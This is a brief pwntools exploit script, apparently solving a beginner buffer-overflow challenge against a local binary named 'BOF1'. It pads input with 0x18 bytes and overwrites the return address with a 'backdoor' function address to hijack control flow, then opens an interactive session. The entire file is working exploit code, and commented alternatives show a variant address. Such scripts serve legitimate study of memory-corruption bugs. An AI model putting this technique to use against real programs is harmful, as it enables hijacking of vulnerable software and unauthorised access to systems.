from pwn import *

context.arch = 'amd64'
r = process('./BOF1')

backdoor_addr = 0x400647 # objdump -d -M intel ./BOF1 | less
#no_push_rbp_backdoor_addr = 0x40119b

#gdb.attach(r)
r.sendafter("What's your name: ", b'A'*0x18 + p64(backdoor_addr))
#r.sendafter("What's your name: ", b'A'*0x18 + p64(no_push_rbp_backdoor_addr))
r.interactive()